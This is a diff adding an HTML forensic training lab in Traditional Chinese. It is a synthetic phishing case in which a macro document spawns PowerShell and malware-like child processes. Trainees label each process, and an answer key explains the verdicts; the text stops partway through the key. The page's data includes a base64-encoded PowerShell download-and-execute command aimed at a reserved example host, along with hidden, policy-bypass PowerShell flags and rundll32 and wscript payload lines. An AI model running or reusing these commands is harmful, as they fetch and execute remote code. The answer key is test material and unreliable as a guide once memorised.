@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>System Informer 鑑識實驗 — 巨集文件的行程樹判讀</title>
+<style>
+  :root{
+    --face:#ECE9E1;
+    --face-hi:#FFFFFF;
+    --face-lo:#9A958A;
+    --face-lo2:#6E6A61;
+    --pane:#FFFFFF;
+    --select:#10306B;
+    --ink:#1B1A17;
+    --ink-soft:#5A554B;
+    --tag-flag:#8C1D18;
+    --tag-clear:#1F5D3F;
+    --row-sys:#D6E9F4;   /* 系統行程 */
+    --row-svc:#FBDBDB;   /* 服務行程 */
+    --row-own:#DCF2DC;   /* 目前使用者的行程 */
+    --row-kin:#FFF3C4;   /* 選取行的直系親屬 */
+    --ui:Tahoma,Verdana,"Noto Sans TC","PingFang TC","Microsoft JhengHei",sans-serif;
+    --mono:Consolas,"Courier New","Noto Sans Mono CJK TC",monospace;
+    --doc:Georgia,"Songti TC","Noto Serif TC",serif;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;padding:18px;background:#7A8393;
+    background-image:linear-gradient(180deg,#7A8393,#5E6675);
+    font-family:var(--ui);color:var(--ink);font-size:13px;line-height:1.5;
+  }
+  .wrap{max-width:1080px;margin:0 auto}
+
+  header.evidence{
+    background:var(--tag-flag);color:#F7EFE6;padding:14px 18px;border:2px solid #5D120F;
+    display:flex;flex-wrap:wrap;gap:6px 26px;align-items:baseline;
+  }
+  header.evidence h1{font-family:var(--doc);font-size:17px;font-weight:400;margin:0;letter-spacing:.02em}
+  header.evidence .meta{font-family:var(--mono);font-size:11px;opacity:.85}
+  header.evidence .meta b{font-weight:400;color:#F0C9C0}
+
+  .bevel-out{border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+             border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2)}
+  .bevel-in{border-top:2px solid var(--face-lo2);border-left:2px solid var(--face-lo2);
+            border-right:2px solid var(--face-hi);border-bottom:2px solid var(--face-hi)}
+
+  .shell{background:var(--face);padding:3px;margin-top:14px}
+  .titlebar{background:linear-gradient(90deg,var(--select),#3B5C9E);color:#fff;
+            padding:3px 6px;font-size:12px;display:flex;justify-content:space-between;align-items:center}
+  .titlebar .btns{font-family:var(--mono);letter-spacing:2px;opacity:.9}
+  .menubar{padding:3px 6px;font-size:12px;color:var(--ink-soft);border-bottom:1px solid var(--face-lo)}
+  .menubar span{margin-right:15px}
+  .menubar u{text-decoration:underline}
+
+  .tabs{display:flex;gap:2px;padding:5px 5px 0}
+  .tab{font-size:12px;padding:3px 13px;background:#DEDACF;color:var(--ink-soft);
+       border-top:1px solid var(--face-hi);border-left:1px solid var(--face-hi);
+       border-right:1px solid var(--face-lo2)}
+  .tab.on{background:var(--face);color:var(--ink);position:relative;top:1px;padding-bottom:4px}
+
+  .listwrap{background:var(--pane);margin:0 3px;overflow-x:auto}
+  table.proc{border-collapse:collapse;width:100%;font-size:12px;white-space:nowrap;min-width:900px}
+  table.proc th{
+    background:linear-gradient(180deg,#FDFDFC,#E7E4DC);font-weight:400;text-align:left;
+    padding:4px 8px;border-right:1px solid #C9C5BB;border-bottom:1px solid #C9C5BB;
+    position:sticky;top:0;z-index:2;font-size:11.5px;
+  }
+  table.proc td{padding:2px 8px;border-bottom:1px solid #F2F1EC}
+  table.proc td.name{font-family:var(--ui)}
+  table.proc td.num,table.proc td.mono{font-family:var(--mono);font-size:11.5px}
+  table.proc td.num{text-align:right}
+  table.proc tr.r-sys td{background:var(--row-sys)}
+  table.proc tr.r-svc td{background:var(--row-svc)}
+  table.proc tr.r-own td{background:var(--row-own)}
+  table.proc tr.row{cursor:pointer}
+  table.proc tr.row.kin td{background:var(--row-kin)}
+  table.proc tr.row.sel td{background:var(--select);color:#fff}
+  table.proc tr.row:hover td{filter:brightness(.96)}
+  table.proc tr.row.sel:hover td{filter:none}
+  .twist{display:inline-block;width:12px;color:var(--ink-soft)}
+  tr.sel .twist{color:#B9C6E3}
+  .dead{color:#8C1D18}
+  tr.sel .dead{color:#F0B7B2}
+  .tag{display:inline-block;font-size:10px;padding:0 5px;border-radius:1px;color:#fff;
+       font-family:var(--ui);vertical-align:1px}
+  .tag.f{background:#B32E27}
+  .tag.c{background:#2E7A55}
+
+  .legend{display:flex;flex-wrap:wrap;gap:4px 16px;padding:6px 8px;font-size:11px;color:var(--ink-soft)}
+  .legend i{display:inline-block;width:22px;height:10px;margin-right:5px;border:1px solid #B7B2A7;vertical-align:-1px}
+
+  .toolbar{padding:6px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;border-top:1px solid var(--face-lo)}
+  button{
+    font-family:var(--ui);font-size:12px;padding:4px 12px;background:var(--face);
+    border-top:2px solid var(--face-hi);border-left:2px solid var(--face-hi);
+    border-right:2px solid var(--face-lo2);border-bottom:2px solid var(--face-lo2);
+    cursor:pointer;color:var(--ink);
+  }
+  button:active{border-top-color:var(--face-lo2);border-left-color:var(--face-lo2);
+                border-right-color:var(--face-hi);border-bottom-color:var(--face-hi)}
+  button:focus-visible{outline:2px dotted var(--ink);outline-offset:-6px}
+  button[disabled]{color:var(--face-lo);cursor:default}
+  button.flag{background:#F3DEDC}
+  button.clear{background:#DDEAE1}
+  .spacer{flex:1}
+  .hint{font-size:11px;color:var(--ink-soft)}
+
+  /* ---- 內容對話框 ---- */
+  .modal-bg{position:fixed;inset:0;background:rgba(20,22,28,.45);display:none;
+            align-items:center;justify-content:center;padding:16px;z-index:20}
+  .modal-bg.open{display:flex}
+  .dlg{background:var(--face);padding:3px;width:min(720px,100%);max-height:90vh;overflow:auto}
+  .dlg-body{padding:10px 12px}
+  .dtabs{display:flex;gap:2px;margin-bottom:0}
+  .dtab{font-size:12px;padding:3px 14px;background:#DEDACF;color:var(--ink-soft);cursor:pointer;
+        border-top:1px solid var(--face-hi);border-left:1px solid var(--face-hi);
+        border-right:1px solid var(--face-lo2)}
+  .dtab.on{background:var(--pane);color:var(--ink)}
+  .dpane{background:var(--pane);padding:10px 12px;display:none}
+  .dpane.on{display:block}
+  .kv{display:grid;grid-template-columns:112px 1fr;gap:3px 10px;font-size:12px}
+  .kv .k{color:var(--ink-soft)}
+  .kv .v{font-family:var(--mono);font-size:11.5px;word-break:break-all;white-space:pre-wrap}
+  .kv .v.warnable{}
+  .sepline{border-top:1px solid #EDEBE4;margin:8px 0}
+  .decoded{background:#F4F7F2;border-left:3px solid var(--tag-clear);padding:6px 9px;
+           font-family:var(--mono);font-size:11.5px;margin-top:8px;word-break:break-all;display:none}
+  .decoded.show{display:block}
+  .netout{font-family:var(--mono);font-size:11.5px;white-space:pre-wrap}
+
+  .report{background:#FBFAF6;margin-top:14px;padding:16px 20px;font-family:var(--doc);font-size:13.5px;line-height:1.65}
+  .report h2{font-size:15px;font-weight:400;margin:0 0 8px;letter-spacing:.03em;
+             border-bottom:1px solid var(--face-lo);padding-bottom:5px}
+  .report h2.again{margin-top:16px}
+  .report p{margin:0 0 9px}
+  .report ol,.report ul{margin:0;padding-left:20px}
+  .report li{margin-bottom:6px}
+  .report code{font-family:var(--mono);font-size:12px;background:var(--face);padding:0 3px}
+  .mailcard{background:var(--pane);border:1px solid var(--face-lo);padding:10px 13px;margin:8px 0 12px;
+            font-family:var(--ui);font-size:12px;line-height:1.7}
+  .mailcard .h{font-family:var(--mono);font-size:11.5px;color:var(--ink-soft)}
+  .mailcard .h b{color:var(--ink);font-weight:400}
+  .mailcard .body{margin-top:7px;padding-top:7px;border-top:1px solid #EDEBE4;font-size:12.5px}
+  .mailcard .att{margin-top:7px;font-family:var(--mono);font-size:11.5px;
+                 background:var(--face);display:inline-block;padding:2px 8px}
+  .score{font-family:var(--mono);font-size:12px;background:var(--face);padding:9px 12px;margin-top:10px;white-space:pre-wrap}
+  .verdict{display:none;margin-top:12px;border-top:1px dashed var(--face-lo);padding-top:12px}
+  .verdict.show{display:block}
+  .vrow{display:flex;gap:9px;padding:4px 0;border-bottom:1px solid #EFEDE6;align-items:baseline}
+  .vrow .vk{font-family:var(--mono);font-size:12px;min-width:34px}
+  .vrow .vv{font-size:12.5px}
+  .vrow.ok .vk{color:var(--tag-clear)}
+  .vrow.no .vk{color:var(--tag-flag)}
+
+  footer{color:#DDE1E8;font-size:11px;margin-top:14px;text-align:center;line-height:1.7}
+  footer b{color:#fff;font-weight:400}
+
+  @media (max-width:760px){
+    body{padding:8px}
+    .kv{grid-template-columns:1fr}
+    .kv .k{margin-top:5px}
+  }
+  @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="evidence">
+    <h1>證物 EV-2026-0422-07 — 使用者主機行程樹快照</h1>
+    <div class="meta">
+      主機 <b>WKS-TPE-0932</b>（172.20.14.61）・ 使用者 <b>CORP\j.chen</b> ・
+      開機 <b>2026-04-22 08:02:09</b> ・ 快照 <b>2026-04-22 10:52:14</b>
+    </div>
+  </header>
+
+  <div class="shell bevel-out">
+    <div class="titlebar">
+      <span>System Informer [CORP\j.chen]  —  即時取證，快照已凍結</span>
+      <span class="btns">_ □ ×</span>
+    </div>
+    <div class="menubar">
+      <span><u>H</u>acker</span><span><u>V</u>iew</span><span><u>T</u>ools</span>
+      <span><u>U</u>sers</span><span><u>H</u>elp</span>
+    </div>
+    <div class="tabs">
+      <span class="tab on">Processes</span>
+      <span class="tab">Services</span>
+      <span class="tab">Network</span>
+      <span class="tab">Disk</span>
+    </div>
+
+    <div class="listwrap bevel-in">
+      <table class="proc">
+        <thead><tr>
+          <th style="width:280px">Name</th>
+          <th style="width:56px">PID</th>
+          <th style="width:170px">Parent</th>
+          <th style="width:56px">CPU</th>
+          <th style="width:92px">Private bytes</th>
+          <th style="width:120px">User name</th>
+          <th class="stcol" style="width:80px;display:none">Started</th>
+          <th>Description</th>
+          <th style="width:52px"></th>
+        </tr></thead>
+        <tbody id="rows"></tbody>
+      </table>
+    </div>
+
+    <div class="legend">
+      <span><i style="background:var(--row-sys)"></i>系統行程</span>
+      <span><i style="background:var(--row-svc)"></i>服務行程</span>
+      <span><i style="background:var(--row-own)"></i>目前使用者的行程</span>
+      <span><i style="background:var(--row-kin)"></i>選取行的父／子（工具沒有這個顏色，是本實驗加的）</span>
+    </div>
+
+    <div class="toolbar">
+      <button id="btnFlat">攤平樹狀（依 PID 排序）</button>
+      <button id="btnTime">顯示 Started 欄</button>
+      <button id="btnOpen" disabled>Properties</button>
+      <span class="spacer"></span>
+      <button id="btnFlag" class="flag" disabled>標記為異常</button>
+      <button id="btnClear" class="clear" disabled>標記為正常</button>
+      <button id="btnCheck">檢查作答</button>
+    </div>
+    <div class="toolbar" style="border-top:0;padding-top:0">
+      <span class="hint" id="hint">點選一列，它的父行程與直接子行程會一起變黃。雙擊開啟 Properties。</span>
+    </div>
+  </div>
+
+  <div class="report">
+    <h2>案情</h2>
+    <p>今天上午 10:52，EDR 對財會部門的 WKS-TPE-0932 發出「Office 應用程式建立命令列直譯器」告警。你到現場時機器還開著，先用 System Informer 把行程樹凍結成快照。使用者 j.chen 說她「早上收到一封請款單的信，附件打開之後畫面閃了一下就沒事了」。</p>
+    <div class="mailcard">
+      <div class="h">寄件者：<b>accounts@vendor-billing.example.com</b>（顯示名稱：<b>XX銀行倉儲 會計部</b>）</div>
+      <div class="h">收件者：<b>j.chen@corp.example.tw</b>　　時間：<b>2026-04-22 10:39</b></div>
+      <div class="h">主旨：<b>【逾期提醒】4 月請款單 未收到付款</b></div>
+      <div class="body">陳小姐您好，附件為 4 月份請款單，系統顯示尚未收到匯款。請於今日下班前確認，逾期將依合約計息。開啟時若出現安全性提示，請點選「啟用內容」以正常顯示表格。</div>
+      <div class="att">📎 請款單_20260422.docx（48 KB）</div>
+    </div>
+    <p>信件裡顯示的附件名稱是 <code>.docx</code>。但依 OOXML 規格，<code>.docx</code> 不能存放巨集專案 —— 能帶巨集的是 <code>.docm</code>。附件實際落地到 Outlook 快取目錄時的檔名，你可以在行程樹裡找到。</p>
+
+    <h2 class="again">你的任務</h2>
+    <ol>
+      <li>逐列判讀 22 個行程，替每一列標記「異常」或「正常」。這裡判的是<em>這個行程與它父行程的關係</em>，不只是程式本身。</li>
+      <li>找出那條從郵件開始的執行鏈，依序寫出 PID。哪一個父子關係是「在正常辦公情境下不可能出現」的？</li>
+      <li>有四列的 Parent 欄顯示 <code>Non-existent process</code>。其中只有一列是異常，其餘三列是 Windows 的正常現象。分別說明理由。</li>
+      <li>有一列被畫在惡意行程底下，但它其實是無辜的。用「顯示 Started 欄」找出證據，並解釋樹狀圖為什麼會畫錯。</li>
+      <li>有一列被畫在合法的服務行程底下，看起來位置正確，其實是假的。說明你用什麼欄位拆穿它。</li>
+      <li>寫下你會如何向使用者說明「她按下的那個『啟用內容』按鈕」造成了什麼。</li>
+    </ol>
+
+    <h2 class="again">附註 — 關於這棵樹怎麼畫出來的</h2>
+    <p>行程樹不是作業系統維護的結構，是工具拿每個行程的 <code>Parent PID</code> 欄位<em>回推</em>畫出來的。這個欄位在行程建立當下寫入後就不再更新，所以它會有三種失真：父行程已經結束（欄位仍指向舊 PID）、PID 被回收再配給別人（於是掛到不相干的行程底下）、以及建立者刻意指定別的行程當父親（T1134.004）。真正的 System Informer 會比對父子的建立時間來過濾第二種情況；本實驗刻意關掉這道校驗，直接照 Parent PID 的值繪製，讓你看見原始資料長什麼樣子。</p>
+    <div class="score" id="score">已標記 0 / 22　　異常 0　　正常 0</div>
+    <div class="verdict" id="verdict"></div>
+  </div>
+
+  <footer>
+    <b>合成資料，僅供教學。</b>主機名稱、帳號、時間與檔名均為虛構；
+    網域取自 RFC 2606 保留名稱，IP 取自 RFC 1918／RFC 5737 保留網段，不對應任何真實主機。
+    此頁面不含可執行的巨集或指令碼，不執行任何命令，也不會對外發出任何請求。
+  </footer>
+</div>
+
+<!-- 招牌元件：Properties 視窗 -->
+<div class="modal-bg" id="modal" role="dialog" aria-modal="true" aria-labelledby="dlgTitle">
+  <div class="dlg bevel-out">
+    <div class="titlebar">
+      <span id="dlgTitle">Properties</span>
+      <span class="btns"><button id="btnX" style="padding:0 7px;font-size:11px">×</button></span>
+    </div>
+    <div class="dlg-body">
+      <div class="dtabs">
+        <span class="dtab on" data-p="p1">General</span>
+        <span class="dtab" data-p="p2">Token</span>
+        <span class="dtab" data-p="p3">Network</span>
+      </div>
+      <div class="dpane bevel-in on" id="p1">
+        <div class="kv" id="kvGeneral"></div>
+        <div class="sepline"></div>
+        <button id="btnDec" style="font-size:11px;padding:3px 10px">Decode -EncodedCommand</button>
+        <div class="decoded" id="dec"></div>
+      </div>
+      <div class="dpane bevel-in" id="p2"><div class="kv" id="kvToken"></div></div>
+      <div class="dpane bevel-in" id="p3"><div class="netout" id="netOut"></div></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  "use strict";
+
+  var B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0"
+          + "ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGkA"
+          + "bAAtAHYAZQByAGkAZgB5AC4AZQB4AGEAbQBwAGwAZQAuAG4AZQB0AC8AaQBuAHYALgBwAHMAMQAn"
+          + "ACkA";
+
+  var U = "CORP\\j.chen";
+  var CACHE = "C:\\Users\\j.chen\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\9K2LQ8ZP\\";
+
+  /* n=列號, d=深度, pp=父行程欄位, ppd=父行程已不存在, cls=著色 */
+  var P = [
+    {n:"01",d:0,name:"System Idle Process",pid:"0",   pp:"—",                          cls:"sys",cpu:"88.41",mem:"60 kB",  user:"NT AUTHORITY\\SYSTEM",st:"08:02:09",desc:""},
+    {n:"02",d:0,name:"System",             pid:"4",   pp:"—",                          cls:"sys",cpu:"0.31", mem:"192 kB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:09",desc:"NT Kernel & System",k:1},
+    {n:"03",d:1,name:"smss.exe",           pid:"312", pp:"System (4)",                 cls:"sys",cpu:"",     mem:"1.1 MB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:09",desc:"Windows Session Manager"},
+    {n:"04",d:0,name:"csrss.exe",          pid:"420", pp:"Non-existent process (312)",ppd:1,cls:"sys",cpu:"0.02",mem:"2.4 MB",user:"NT AUTHORITY\\SYSTEM",st:"08:02:10",desc:"Client Server Runtime Process"},
+    {n:"05",d:0,name:"wininit.exe",        pid:"500", pp:"Non-existent process (312)",ppd:1,cls:"sys",cpu:"", mem:"1.9 MB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:10",desc:"Windows Start-Up Application",k:1},
+    {n:"06",d:1,name:"services.exe",       pid:"668", pp:"wininit.exe (500)",          cls:"sys",cpu:"0.04", mem:"6.8 MB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:11",desc:"Services and Controller app",k:1},
+    {n:"07",d:2,name:"svchost.exe",        pid:"860", pp:"services.exe (668)",         cls:"svc",cpu:"0.01", mem:"12.4 MB",user:"NT AUTHORITY\\SYSTEM",st:"08:02:12",desc:"Host Process for Windows Services"},
+    {n:"08",d:2,name:"svchost.exe",        pid:"1120",pp:"services.exe (668)",         cls:"svc",cpu:"0.06", mem:"21.7 MB",user:"NT AUTHORITY\\NETWORK SERVICE",st:"08:02:14",desc:"Host Process for Windows Services",k:1},
+    {n:"09",d:3,name:"taskhostw.exe",      pid:"7442",pp:"svchost.exe (1120)",         cls:"svc",cpu:"0.00", mem:"4.2 MB", user:U,                      st:"10:47:33",desc:""},
+    {n:"10",d:2,name:"spoolsv.exe",        pid:"1804",pp:"services.exe (668)",         cls:"svc",cpu:"",     mem:"9.1 MB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:18",desc:"Spooler SubSystem App"},
+    {n:"11",d:0,name:"winlogon.exe",       pid:"556", pp:"Non-existent process (312)",ppd:1,cls:"sys",cpu:"",mem:"2.8 MB", user:"NT AUTHORITY\\SYSTEM",st:"08:02:10",desc:"Windows Logon Application"},
+    {n:"12",d:0,name:"explorer.exe",       pid:"3120",pp:"Non-existent process (2988)",ppd:1,cls:"own",cpu:"0.18",mem:"78.3 MB",user:U,st:"08:02:40",desc:"Windows Explorer",k:1},
+    {n:"13",d:1,name:"chrome.exe",         pid:"4808",pp:"explorer.exe (3120)",        cls:"own",cpu:"1.20", mem:"210.5 MB",user:U,st:"09:31:07",desc:"Google Chrome",k:1},
+    {n:"14",d:2,name:"chrome.exe",         pid:"4912",pp:"chrome.exe (4808)",          cls:"own",cpu:"0.44", mem:"96.2 MB",user:U,st:"09:31:08",desc:"Google Chrome"},
+    {n:"15",d:1,name:"OUTLOOK.EXE",        pid:"4120",pp:"explorer.exe (3120)",        cls:"own",cpu:"0.35", mem:"168.9 MB",user:U,st:"08:03:12",desc:"Microsoft Outlook",k:1},
+    {n:"16",d:2,name:"WINWORD.EXE",        pid:"5308",pp:"OUTLOOK.EXE (4120)",         cls:"own",cpu:"0.62", mem:"142.6 MB",user:U,st:"10:41:38",desc:"Microsoft Word",k:1},
+    {n:"17",d:3,name:"powershell.exe",     pid:"6412",pp:"WINWORD.EXE (5308)",         cls:"own",cpu:"0.08", mem:"58.4 MB",user:U,st:"10:41:52",desc:"Windows PowerShell",k:1},
+    {n:"18",d:4,name:"conhost.exe",        pid:"6520",pp:"powershell.exe (6412)",      cls:"own",cpu:"",     mem:"6.6 MB", user:U,st:"10:41:52",desc:"Console Window Host"},
+    {n:"19",d:4,name:"WmiPrvSE.exe",       pid:"3888",pp:"powershell.exe (6412)",      cls:"svc",cpu:"",     mem:"11.3 MB",user:"NT AUTHORITY\\NETWORK SERVICE",st:"09:15:04",desc:"WMI Provider Host"},
+    {n:"20",d:4,name:"svchost.exe",        pid:"6980",pp:"powershell.exe (6412)",      cls:"own",cpu:"0.02", mem:"8.9 MB", user:U,st:"10:41:58",desc:"",k:1},
+    {n:"21",d:5,name:"rundll32.exe",       pid:"7104",pp:"svchost.exe (6980)",         cls:"own",cpu:"0.01", mem:"7.4 MB", user:U,st:"10:42:06",desc:"Windows host process (Rundll32)"},
+    {n:"22",d:0,name:"wscript.exe",        pid:"7220",pp:"Non-existent process (6688)",ppd:1,cls:"own",cpu:"",mem:"5.2 MB",user:U,st:"10:42:41",desc:"Microsoft \u00AE Windows Based Script Host"}
+  ];
+
+  /* Properties 內容：只放事實，不放結論 */
+  var D = {
+    "0":   {file:"",company:"",path:"",cmd:"",cwd:"",sig:"—",int:"System",elev:"否",net:[]},
+    "4":   {file:"ntoskrnl.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\ntoskrnl.exe",cmd:"",cwd:"",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "312": {file:"smss.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\smss.exe",cmd:"\\SystemRoot\\System32\\smss.exe",cwd:"C:\\Windows\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "420": {file:"csrss.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\csrss.exe",cmd:"%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows ...",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "500": {file:"wininit.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\wininit.exe",cmd:"wininit.exe",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "556": {file:"winlogon.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\winlogon.exe",cmd:"winlogon.exe",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "668": {file:"services.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\services.exe",cmd:"C:\\Windows\\system32\\services.exe",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "860": {file:"svchost.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\svchost.exe",cmd:"C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "1120":{file:"svchost.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\svchost.exe",cmd:"C:\\Windows\\system32\\svchost.exe -k netsvcs -p",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"否",net:[]},
+    "1804":{file:"spoolsv.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\spoolsv.exe",cmd:"C:\\Windows\\System32\\spoolsv.exe",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"是",net:[]},
+    "3120":{file:"explorer.exe",company:"Microsoft Corporation",path:"C:\\Windows\\explorer.exe",cmd:"C:\\Windows\\Explorer.EXE",cwd:"C:\\Windows\\",sig:"Microsoft Windows（已驗證）",int:"Medium",elev:"否",net:[]},
+    "3888":{file:"WmiPrvSE.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",cmd:"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",cwd:"C:\\Windows\\system32\\",sig:"Microsoft Windows（已驗證）",int:"System",elev:"否",net:[]},
+    "4120":{file:"OUTLOOK.EXE",company:"Microsoft Corporation",path:"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",cmd:"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",cwd:"C:\\Users\\j.chen\\",sig:"Microsoft Corporation（已驗證）",int:"Medium",elev:"否",
+            net:["TCP  172.20.14.61:51204   172.20.10.25:443    ESTABLISHED"]},
+    "4808":{file:"chrome.exe",company:"Google LLC",path:"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",cmd:"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",cwd:"C:\\Users\\j.chen\\",sig:"Google LLC（已驗證）",int:"Medium",elev:"否",
+            net:["TCP  172.20.14.61:51877   172.20.10.9:8080    ESTABLISHED"]},
+    "4912":{file:"chrome.exe",company:"Google LLC",path:"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",cmd:"\"...chrome.exe\" --type=renderer --lang=zh-TW",cwd:"C:\\Users\\j.chen\\",sig:"Google LLC（已驗證）",int:"Low",elev:"否",net:[]},
+    "5308":{file:"WINWORD.EXE",company:"Microsoft Corporation",path:"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+            cmd:"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"" + CACHE + "\u8ACB\u6B3E\u55AE_20260422.docm\"",
+            cwd:CACHE,sig:"Microsoft Corporation（已驗證）",int:"Medium",elev:"否",net:[]},
+    "6412":{file:"powershell.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            cmd:"powershell.exe -nop -w hidden -ep bypass -enc " + B64,
+            cwd:CACHE,sig:"Microsoft Windows（已驗證）",int:"Medium",elev:"否",
+            net:["TCP  172.20.14.61:52033   198.51.100.23:80    TIME_WAIT",
+                 "TCP  172.20.14.61:52041   203.0.113.55:443    ESTABLISHED"]},
+    "6520":{file:"conhost.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\conhost.exe",cmd:"\\??\\C:\\Windows\\system32\\conhost.exe 0x4",cwd:CACHE,sig:"Microsoft Windows（已驗證）",int:"Medium",elev:"否",net:[]},
+    "6980":{file:"svchost.exe",company:"",path:"C:\\Users\\j.chen\\AppData\\Roaming\\Microsoft\\Windows\\svchost.exe",
+            cmd:"\"C:\\Users\\j.chen\\AppData\\Roaming\\Microsoft\\Windows\\svchost.exe\"",
+            cwd:"C:\\Users\\j.chen\\AppData\\Roaming\\Microsoft\\Windows\\",sig:"※ 未經簽署",int:"Medium",elev:"否",
+            net:["TCP  172.20.14.61:52099   203.0.113.55:443    ESTABLISHED"]},
+    "7104":{file:"rundll32.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\rundll32.exe",
+            cmd:"rundll32.exe C:\\Users\\j.chen\\AppData\\Local\\Temp\\vfy32.dll,Start",
+            cwd:"C:\\Users\\j.chen\\AppData\\Local\\Temp\\",sig:"Microsoft Windows（已驗證）",int:"Medium",elev:"否",net:[]},
+    "7220":{file:"wscript.exe",company:"Microsoft Corporation",path:"C:\\Windows\\System32\\wscript.exe",
+            cmd:"wscript.exe //B //E:jscript C:\\Users\\j.chen\\AppData\\Local\\Temp\\upd.js",
+            cwd:"C:\\Users\\j.chen\\AppData\\Local\\Temp\\",sig:"Microsoft Windows（已驗證）",int:"Medium",elev:"否",
+            net:["TCP  172.20.14.61:52140   198.51.100.23:80    ESTABLISHED"]},
+    "7442":{file:"taskhostw.exe",company:"",path:"C:\\Users\\j.chen\\AppData\\Local\\Temp\\taskhostw.exe",
+            cmd:"\"C:\\Users\\j.chen\\AppData\\Local\\Temp\\taskhostw.exe\"",
+            cwd:"C:\\Users\\j.chen\\AppData\\Local\\Temp\\",sig:"※ 未經簽署",int:"Medium",elev:"否",net:[]}
+  };
+
+  var KEY = {
+    "01":{bad:false,why:"閒置行程，永遠存在，沒有父行程。"},
+    "02":{bad:false,why:"核心本體，PID 固定為 4。"},
+    "03":{bad:false,why:"工作階段管理員，由 System 建立，開機第一秒的標準流程。"},
+    "04":{bad:false,why:"Non-existent process 的正常版本。csrss 由 smss 建立，smss 完成初始化後就自行結束，所以父行程欄位永遠指向一個已消失的 PID。看到紅字不等於有事。"},
+    "05":{bad:false,why:"同上，wininit 也是 smss 建立後留下的孤兒。"},
+    "06":{bad:false,why:"服務控制管理員，父行程是 wininit，開機時序正確。"},
+    "07":{bad:false,why:"svchost 帶 -k DcomLaunch，路徑在 System32，父行程是 services.exe —— 三個條件都對。"},
+    "08":{bad:false,why:"同上，-k netsvcs 群組。"},
+    "09":{bad:true, why:"PPID 詐騙（T1134.004）。它被畫在合法的 svchost 底下，位置看起來完全正確，但：影像路徑在 %TEMP%（真品在 System32）、未經簽署、沒有 -k 之類的工作參數、而且啟動時間是 10:47:33 —— 開機兩小時四十五分之後，剛好在這條攻擊鏈的尾端。真正由排程服務啟動的 taskhostw 不會長這樣。位置是可以偽造的，路徑、簽章、時間不行。"},
+    "10":{bad:false,why:"列印多工緩衝處理器，開機時啟動的標準服務。"},
+    "11":{bad:false,why:"同 04、05，winlogon 也是 smss 留下的孤兒，正常。"},
+    "12":{bad:false,why:"第四個 Non-existent process，也是正常的：explorer 由 userinit.exe 建立，userinit 交棒後立刻結束。這是每一台 Windows 都會看到的畫面。"},
+    "13":{bad:false,why:"使用者從工作列開啟瀏覽器。"},
+    "14":{bad:false,why:"Chrome 的分頁行程，父行程是自己的主行程，多行程架構的正常樣貌。"},
+    "15":{bad:false,why:"Outlook 由 explorer 啟動，使用者自己開的。"},
+    "16":{bad:false,why:"關鍵的起點，但關係本身正常 —— 從信件裡雙擊附件，Word 就是會掛在 Outlook 底下。Word 本體有效簽章、路徑在 Program Files，沒有任何可指摘之處。真正的線索在命令列：載入的檔案是 .docm，而信件顯示的是 .docx。要判的是它生出了什麼，不是它自己。"},
